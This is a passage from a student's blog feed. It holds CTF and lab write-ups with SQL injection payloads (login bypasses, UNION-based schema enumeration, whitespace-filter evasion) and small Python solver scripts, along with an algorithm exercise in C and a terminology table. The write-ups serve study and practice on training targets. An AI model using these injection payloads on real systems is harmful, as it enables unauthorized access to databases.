class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; hashlib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; itertools &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;flag = []&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;wordlist = string.printable&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;s = requests.session()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;number&quot;&gt;40&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    cookie = s.get(&lt;span class=&quot;string&quot;&gt;&#39;http://159.89.166.12:13500/&#39;&lt;/span&gt;).cookies[&lt;span class=&quot;string&quot;&gt;&#39;flag&#39;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    flag.append(cookie)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; (flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;result= []&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; flag:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; j &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; permutations(wordlist,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        guess = &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;.join(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        md5 = hashlib.md5(guess.encode(&lt;span class=&quot;string&quot;&gt;&quot;utf8&quot;&lt;/span&gt;)).hexdigest()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; md5 ==i:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            result.append(guess)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; (result)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="http://chenxiyuan.vip/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>bugku速度要快wp</title>
    <link href="http://chenxiyuan.vip/2018/12/10/bugku%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%ABwp/"/>
    <id>http://chenxiyuan.vip/2018/12/10/bugku速度要快wp/</id>
    <published>2018-12-10T14:57:01.000Z</published>
    <updated>2018-12-10T15:06:49.866Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://123.206.87.240:8002/web6/" target="_blank" rel="noopener">http://123.206.87.240:8002/web6/</a><br>这道题我首先在headers里发现flag，base64解码然后提交失败，发现是需要post得到的数据，然后试了半天都不对，结果发现需要post的是两次解码后的得到的数字。。。<br>无语，上代码</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://123.206.87.240:8002/web6/'</span></span><br><span class="line">s = requests.Session()<span class="comment">#创建session对象，保存Cookie值</span></span><br><span class="line">r = s.get(url)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">txt1 = re.search("flag': '(.*?)',",str(r.headers),re.S)</span></span><br><span class="line"><span class="string">txt2=re.search(".*?: (.*?)'",str(base64.b64decode(txt1.group(1))),re.S)</span></span><br><span class="line"><span class="string">这个是我刚开始绕的弯路,基础功不扎实</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">txt1=r.headers[<span class="string">'flag'</span>]</span><br><span class="line">txt2=re.search(<span class="string">".*?: (.*?)'"</span>,str(base64.b64decode(txt1)),re.S)</span><br><span class="line">flag=base64.b64decode(txt2.group(<span class="number">1</span>))</span><br><span class="line">d=&#123;<span class="string">"margin"</span>:flag&#125;</span><br><span class="line">print(s.post(url,data=d).text)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://123.206.87.240:8002/web6/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://123.206.87.240:8002/web6/&lt;/a&gt;&lt;br&gt;这道题我首先在headers里发现flag，base64解码然后提交失败，发现是需要post得到的数据，然后试了半天都不对，结果发现需要post的是两次解码后的得到的数字。。。&lt;br&gt;无语，上代码&lt;/p&gt;
    
    </summary>
    
      <category term="web安全学习笔记" scheme="http://chenxiyuan.vip/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
      <category term="web安全" scheme="http://chenxiyuan.vip/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>nctf打卡题</title>
    <link href="http://chenxiyuan.vip/2018/11/27/nctf%E6%89%93%E5%8D%A1%E9%A2%98/"/>
    <id>http://chenxiyuan.vip/2018/11/27/nctf打卡题/</id>
    <published>2018-11-27T11:47:09.000Z</published>
    <updated>2018-11-27T12:13:16.329Z</updated>
    
    <content type="html"><![CDATA[<p>我果真是太菜了，nctf只做出了web签到题和re签到题外加打了一个i wanna，连web的sql注入签到都没有做出来，在看了一位大佬的write up后，感觉收获很多。<br><a href="http://ctfgame.acdxvfsvd.net:20001/" target="_blank" rel="noopener">http://ctfgame.acdxvfsvd.net:20001/</a><br>首先学到了空格的过滤绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/    ()</span><br></pre></td></tr></table></figure></p><p>发现过滤了截断符号%23,#,–+，只要在语句最后在加个单引号使其闭合就可以了，’’空的也可以执行，就不用用注释了。<br>然后大佬提到’必须直接跟在select后。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1''    查询:<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'1'''</span> LIMIT0,<span class="number">1</span>     可以</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and 1=1'</span> 查询:<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="string">''</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>   不可以</span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="string">'  union select 1,2,3'</span>   可以</span><br></pre></td></tr></table></figure></p><p>然后用子查询进行操作,select * from user where id=’-1’ union select (select group_concat(schema_name) from information_schema.schemata),2,3’，这样就行了。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(<span class="keyword">select</span>%a0group_concat(schema_name)%a0from%a0information_schema.schemata),<span class="number">2</span>,<span class="number">3</span>%<span class="number">27</span>爆数据库名，应该是这个flaaaaaaag数据库。</span><br><span class="line"><span class="keyword">http</span>://ctfgame.acdxvfsvd.net:<span class="number">20001</span>/index.php?<span class="keyword">id</span>=<span class="number">1</span>%<span class="number">27</span>%a0union%a0select%a0(<span class="keyword">select</span>%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=%<span class="number">27</span>flaaaaaaag%<span class="number">27</span>),<span class="number">2</span>,<span class="number">3</span>%<span class="number">27</span>爆表名，f144444444g</span><br><span class="line"><span class="keyword">http</span>://ctfgame.acdxvfsvd.net:<span class="number">20001</span>/index.php?<span class="keyword">id</span>=<span class="number">1</span>%<span class="number">27</span>%a0union%a0select%a0(<span class="keyword">select</span>%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=%<span class="number">27</span>f144444444g%<span class="number">27</span>),<span class="number">2</span>,<span class="number">3</span>%<span class="number">27</span>爆列名，th1s_1s_flag</span><br><span class="line"><span class="keyword">http</span>://ctfgame.acdxvfsvd.net:<span class="number">20001</span>/index.php?<span class="keyword">id</span>=<span class="number">1</span>%<span class="number">27</span>%a0union%a0select%a0(<span class="keyword">select</span>%a0th1s_1s_flag%a0from%a0flaaaaaaag.f144444444g),<span class="number">2</span>,<span class="number">3</span>%<span class="number">27</span>查询到flag</span><br></pre></td></tr></table></figure></p><p>收获很多。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我果真是太菜了，nctf只做出了web签到题和re签到题外加打了一个i wanna，连web的sql注入签到都没有做出来，在看了一位大佬的write up后，感觉收获很多。&lt;br&gt;&lt;a href=&quot;http://ctfgame.acdxvfsvd.net:20001/&quot; t
      
    
    </summary>
    
      <category term="web安全学习笔记" scheme="http://chenxiyuan.vip/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://chenxiyuan.vip/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="sql注入" scheme="http://chenxiyuan.vip/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>11.15</title>
    <link href="http://chenxiyuan.vip/2018/11/15/11-15/"/>
    <id>http://chenxiyuan.vip/2018/11/15/11-15/</id>
    <published>2018-11-15T09:33:15.000Z</published>
    <updated>2019-05-07T12:47:52.151Z</updated>
    
    <content type="html"><![CDATA[<p>这几天又开始学前端了，准备和活动室里两个大佬合伙做院科协的网页设计活动，真的很忙呀！！！<br>然后昨天郁师傅推荐了一个上传漏洞的靶场<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a>，于是我又要学php了，得学会php的代码审计吧！！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这几天又开始学前端了，准备和活动室里两个大佬合伙做院科协的网页设计活动，真的很忙呀！！！&lt;br&gt;然后昨天郁师傅推荐了一个上传漏洞的靶场&lt;a href=&quot;https://github.com/c0ny1/upload-labs&quot; target=&quot;_blank&quot; rel=&quot;no
      
    
    </summary>
    
      <category term="随笔" scheme="http://chenxiyuan.vip/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>铺地毯问题</title>
    <link href="http://chenxiyuan.vip/2018/11/04/%E9%93%BA%E5%9C%B0%E6%AF%AF%E9%97%AE%E9%A2%98/"/>
    <id>http://chenxiyuan.vip/2018/11/04/铺地毯问题/</id>
    <published>2018-11-04T02:43:19.000Z</published>
    <updated>2018-11-04T03:12:59.966Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://i1.fuimg.com/665720/1c38c0a3231c128a.png" alt="Markdown"><br><img src="http://i1.fuimg.com/665720/9dce7adb8d106511.png" alt="Markdown"><br>这道题我进坑了，我看到这个题的第一反应就是定义一个二维数组模拟坐标系，按顺序把地毯数存进覆盖的坐标中。然后我就看到内存达到128000KB，下载输入测试文件，发现了10000个地毯数据QAQ~!!<br><img src="http://i2.tiimg.com/665720/d23265a1ec0769f7.png" alt="Markdown"><br><a id="more"></a><br>刚开始的代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">10001</span>][<span class="number">10001</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x,y,a,b,g,h;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d %d"</span>,&amp;a,&amp;b,&amp;g,&amp;h);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=a;j&lt;=a+g;j++)<span class="comment">//把地毯覆盖的点赋值 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k=b;k&lt;=b+h;k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">array</span>[j][k]=i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;x,&amp;y);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">array</span>[x][y]==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-1"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"%d"</span>,<span class="built_in">array</span>[x][y]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><hr><p>然后我就去看下大佬是怎么解决的，瞬间就明白了，微笑，默叹，以为妙绝。<br>正确思路应该是这样的，定义一个数组，按顺序保存地毯四个角的坐标，再逆序判断给定点是否在地毯内就行了。<br>改写代码如下，顺利AC，收获挺大的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10001</span>][<span class="number">5</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y,n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d %d %d %d"</span>,&amp;a[i][<span class="number">1</span>],&amp;a[i][<span class="number">2</span>],&amp;a[i][<span class="number">3</span>],&amp;a[i][<span class="number">4</span>]);</span><br><span class="line">        a[i][<span class="number">3</span>]+=a[i][<span class="number">1</span>];</span><br><span class="line">        a[i][<span class="number">4</span>]+=a[i][<span class="number">2</span>];</span><br><span class="line">    &#125;<span class="comment">//数组只是用来记录第i个地毯的四个点的坐标 </span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;x,&amp;y);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;=<span class="number">1</span>;i--)<span class="comment">//逆序判断地毯是否覆盖（x，y）</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i][<span class="number">1</span>]&lt;=x&amp;&amp;a[i][<span class="number">2</span>]&lt;=y&amp;&amp;a[i][<span class="number">3</span>]&gt;=x&amp;&amp;a[i][<span class="number">4</span>]&gt;=y) </span><br><span class="line">&#123;<span class="built_in">printf</span>(<span class="string">"%d"</span>,i);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-1"</span>);<span class="comment">//没有则输出-1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://i1.fuimg.com/665720/1c38c0a3231c128a.png&quot; alt=&quot;Markdown&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://i1.fuimg.com/665720/9dce7adb8d106511.png&quot; alt=&quot;Markdown&quot;&gt;&lt;br&gt;这道题我进坑了，我看到这个题的第一反应就是定义一个二维数组模拟坐标系，按顺序把地毯数存进覆盖的坐标中。然后我就看到内存达到128000KB，下载输入测试文件，发现了10000个地毯数据QAQ~!!&lt;br&gt;&lt;img src=&quot;http://i2.tiimg.com/665720/d23265a1ec0769f7.png&quot; alt=&quot;Markdown&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="算法竞赛学习笔记" scheme="http://chenxiyuan.vip/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="算法" scheme="http://chenxiyuan.vip/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="c" scheme="http://chenxiyuan.vip/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>尝试简单的sql注入</title>
    <link href="http://chenxiyuan.vip/2018/11/02/%E7%AE%80%E5%8D%95%E7%9A%84sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://chenxiyuan.vip/2018/11/02/简单的sql注入/</id>
    <published>2018-11-02T15:07:56.000Z</published>
    <updated>2018-11-02T16:17:29.519Z</updated>
    
    <content type="html"><![CDATA[<p>感觉有点汗颜，因为线代、高数，以及我萌生了想学算法的念头，导致我没时间学习安全，今天下午没课我就练了几道简单的sql注入题。<br>说来都是巧合，昨天我们c语言老师推荐了第四版的《加密与解密》，今天我就望着价钱瑟瑟发抖，然后看见这本书是由看雪论坛的大神写的，所以机缘巧合就看到了这个帖子。<a href="https://bbs.pediy.com/thread-218653.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-218653.htm</a><br>这个帖子里提供了几个云靶机。我就选择了OWASP Bricks练手(我是菜鸟),这是地址<a href="http://43.247.91.228:83/login-pages.html" target="_blank" rel="noopener">http://43.247.91.228:83/login-pages.html</a><br><a id="more"></a><br>第一题在username输入以下语句都可以，只要让引号闭合并使语句成立就行，比如可以在后面加#，注释掉后面的语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1' or 1 <span class="comment">#</span></span><br><span class="line">1' or 1 or '</span><br><span class="line">' or 1 <span class="comment">#</span></span><br><span class="line">' or 1 or '</span><br><span class="line">1' or 1=1 <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><hr><p>第二题发现使用了js验证，加了黑名单禁止输入特殊字符。可以右键查看源代码看看js代码，然后打开开发者工具在console里修改该js函数，再使用注入语句就行了。<br><img src="http://i1.fuimg.com/665720/d3c609b2d711cc88.png" alt="第2题"><br><img src="http://i1.fuimg.com/665720/e71b70b1dcc2c017.png" alt="第2题"></p><hr><p>第三题发现它在两边加入了括号()，所以只要构造语句使括号闭合就行。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1') or 1 <span class="comment">#</span></span><br><span class="line">1') or 1 or('</span><br></pre></td></tr></table></figure></p><hr><p>第四题和第三题差不多，只不过使用双引号””包裹字符串。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1") or 1 <span class="comment">#</span></span><br><span class="line">1") or 1 or ("</span><br></pre></td></tr></table></figure></p><hr><p>第五题直接用第一题的语句注入，发现返回了输入密码的MD5值，虽然我不知道这是干什么的。</p><hr><p>第六题我也不知道是干啥的，可以直接注入，我搜了下题目名automatic redirect 叫自动重定向。我再问问大佬这是啥。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;感觉有点汗颜，因为线代、高数，以及我萌生了想学算法的念头，导致我没时间学习安全，今天下午没课我就练了几道简单的sql注入题。&lt;br&gt;说来都是巧合，昨天我们c语言老师推荐了第四版的《加密与解密》，今天我就望着价钱瑟瑟发抖，然后看见这本书是由看雪论坛的大神写的，所以机缘巧合就看到了这个帖子。&lt;a href=&quot;https://bbs.pediy.com/thread-218653.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://bbs.pediy.com/thread-218653.htm&lt;/a&gt;&lt;br&gt;这个帖子里提供了几个云靶机。我就选择了OWASP Bricks练手(我是菜鸟),这是地址&lt;a href=&quot;http://43.247.91.228:83/login-pages.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://43.247.91.228:83/login-pages.html&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全学习笔记" scheme="http://chenxiyuan.vip/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://chenxiyuan.vip/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="sql注入" scheme="http://chenxiyuan.vip/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>算法上的一些术语</title>
    <link href="http://chenxiyuan.vip/2018/11/02/%E7%AE%97%E6%B3%95%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9C%AF%E8%AF%AD/"/>
    <id>http://chenxiyuan.vip/2018/11/02/算法上的一些术语/</id>
    <published>2018-11-02T03:00:30.000Z</published>
    <updated>2018-11-02T07:23:23.027Z</updated>
    
    <content type="html"><![CDATA[<p>我发现了一个较严重问题，就是听不懂大佬说的一些名词，感受到了莫名的恐惧？？？于是我从网上找了一些术语，写在这里。<br><a id="more"></a></p><h2 id="OJ平台"><a href="#OJ平台" class="headerlink" title="OJ平台"></a>OJ平台</h2><table><thead><tr><th>简写</th><th>全称</th><th>中文称谓</th></tr></thead><tbody><tr><td>OJ</td><td>Online Judge</td><td>在线判题系统</td></tr><tr><td>AC</td><td>Accepted</td><td>通过</td></tr><tr><td>WA</td><td>Wrong Answer</td><td>答案错误</td></tr><tr><td>TLE</td><td>Time Limit Exceed</td><td>超时</td></tr><tr><td>OLE</td><td>Output Limit Exceed</td><td>超过输出限制</td></tr><tr><td>MLE</td><td>Memory Limit Exceed</td><td>超内存</td></tr><tr><td>RE</td><td>Runtime Error</td><td>运行时错误</td></tr><tr><td>PE</td><td>Presentation Error</td><td>格式错误</td></tr><tr><td>CE</td><td>Compile Error</td><td>无法编译</td></tr></tbody></table><hr><h2 id="算法常用术语英中对照"><a href="#算法常用术语英中对照" class="headerlink" title="算法常用术语英中对照"></a>算法常用术语英中对照</h2><table><thead><tr><th>英语</th><th>中文</th></tr></thead><tbody><tr><td>Approximate String Matching</td><td>模糊匹配</td></tr><tr><td>Arbitrary Precision Arithmetic</td><td>高精度计算</td></tr><tr><td>Bandwidth Reduction</td><td>带宽压缩</td></tr><tr><td>Bin Packing</td><td>装箱问题</td></tr><tr><td>Calendrical Calculations</td><td>日期</td></tr><tr><td>Clique</td><td>最大团</td></tr><tr><td>Combinatorial Problems</td><td>组合问题</td></tr><tr><td>Computational Geometry</td><td>计算几何</td></tr><tr><td>Connected Components</td><td>连通分支</td></tr><tr><td>Constrained and Unconstrained Optimization</td><td>最值问题</td></tr><tr><td>Convex Hull</td><td>凸包</td></tr><tr><td>Cryptography</td><td>密码</td></tr><tr><td>Data Structures</td><td>基本数据结构</td></tr><tr><td>Determinants and Permanents</td><td>行列式</td></tr><tr><td>Dictionaries</td><td>字典</td></tr><tr><td>Discrete Fourier Transform</td><td>离散Fourier变换</td></tr><tr><td>Drawing Graphs Nicely</td><td>图的描绘</td></tr><tr><td>Drawing Trees</td><td>树的描绘</td></tr><tr><td>Edge and Vertex Connectivity</td><td>割边/割点</td></tr><tr><td>Edge Coloring</td><td>边染色</td></tr><tr><td>Eulerian Cycle / Chinese Postman Euler</td><td>回路/中国邮路</td></tr><tr><td>Factoring and Primality Testing</td><td>因子分解/质数判定</td></tr><tr><td>Feedback Edge/Vertex Set</td><td>最大无环子图</td></tr><tr><td>Finite State Machine Minimization</td><td>有穷自动机简化</td></tr><tr><td>Generating Graphs</td><td>图的生成</td></tr><tr><td>Generating Partitions</td><td>划分生成</td></tr><tr><td>GeneratingPermutations</td><td>排列生成</td></tr><tr><td>GeneratingSubsets</td><td>子集生成</td></tr><tr><td>Graph Data Structures</td><td>图形数据结构</td></tr><tr><td>Graph Isomorphism</td><td>图同构</td></tr><tr><td>Graph Partition</td><td>图的划分</td></tr><tr><td>Graph Problems — hard</td><td>图论-NP问题</td></tr><tr><td>Graph Problems — polynomial</td><td>图论-多项式算法</td></tr><tr><td>Hamiltonian Cycle Hamilton</td><td>回路</td></tr><tr><td>Independent Set</td><td>独立集</td></tr><tr><td>Intersection Detection</td><td>碰撞测试</td></tr><tr><td>Job Scheduling</td><td>工程安排</td></tr><tr><td>Kd-Trees</td><td>线段树</td></tr><tr><td>Knapsack Problem</td><td>背包问题</td></tr><tr><td>Linear Programming</td><td>线性规划</td></tr><tr><td>Longest Common Substring</td><td>最长公共子串</td></tr><tr><td>Maintaining Line Arrangements</td><td>平面分割</td></tr><tr><td>Matching</td><td>匹配</td></tr><tr><td>Matrix Multiplication</td><td>矩阵乘法</td></tr><tr><td>Medial-Axis Transformation</td><td>中轴变换</td></tr><tr><td>Median and Selection</td><td>中位数</td></tr><tr><td>Minimum Spanning Tree</td><td>最小生成树</td></tr><tr><td>Minkowski Sum</td><td>Minkowski和</td></tr><tr><td>Motion Planning</td><td>运动规划</td></tr><tr><td>Nearest Neighbor Search</td><td>最近点对查询</td></tr><tr><td>Network Flow</td><td>网络流</td></tr><tr><td>Numerical Problems</td><td>数值问题</td></tr><tr><td>Planarity Detection and 